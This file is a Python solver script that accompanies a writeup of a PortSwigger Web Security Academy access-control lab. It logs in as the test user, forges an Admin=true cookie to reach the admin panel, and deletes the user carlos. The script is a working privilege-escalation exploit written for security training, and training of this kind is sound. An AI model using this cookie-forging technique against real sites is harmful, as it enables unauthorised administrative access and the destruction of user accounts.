#!/usr/bin/env python3
"""
User role controlled by request parameter
PortSwigger Web Security Academy -- Access Control

Companion script for the writeup: 03-user-role-controlled-by-request-parameter.md

What this does:
    Logs in as wiener, then overwrites the server-issued Admin cookie
    (Admin=false) with Admin=true. httpx's cookie jar keys cookies by domain,
    so the override must be bound to the lab's hostname or it silently
    creates a second cookie instead of replacing the server's one. With the
    cookie overridden, /admin renders the full panel; the script locates the
    delete link for carlos and follows it.

Usage:
    python 03-user-role-controlled-by-request-parameter.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx
from urllib.parse import urlparse, urljoin


def get_csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def login(client: httpx.Client, base: str, username: str, password: str) -> httpx.Response:
    login_page = client.get(f"{base}/login")
    csrf = get_csrf(login_page.text)
    return client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    domain = urlparse(lab_url).hostname

    login(client, lab_url, "wiener", "peter")

    # Must specify domain= or this creates a second cookie instead of overriding
    # the server-set Admin=false one -- httpx keys cookies by (name, domain).
    client.cookies.set("Admin", "true", domain=domain)
    resp = client.get(f"{lab_url}/admin")
    print(f"[*] /admin with Admin=true cookie: {resp.status_code}")

    delete_match = re.search(r'href="([^"]*\?username=carlos[^"]*)"', resp.text, re.IGNORECASE)
    if not delete_match:
        delete_match = re.search(r'href="([^"]*delete[^"]*carlos[^"]*)"', resp.text, re.IGNORECASE)

    if delete_match:
        delete_path = delete_match.group(1)
        delete_url = f"{lab_url}{delete_path}" if delete_path.startswith("/") else urljoin(f"{lab_url}/admin/", delete_path)
        print(f"[*] Deleting carlos via: {delete_url}")
        client.get(delete_url)
    else:
        print("[*] No delete link found, trying common delete pattern")
        client.get(f"{lab_url}/admin/delete", params={"username": "carlos"})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted after forging Admin=true cookie.")
    else:
        print("[-] Not solved yet -- confirm the cookie domain matches the lab hostname.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
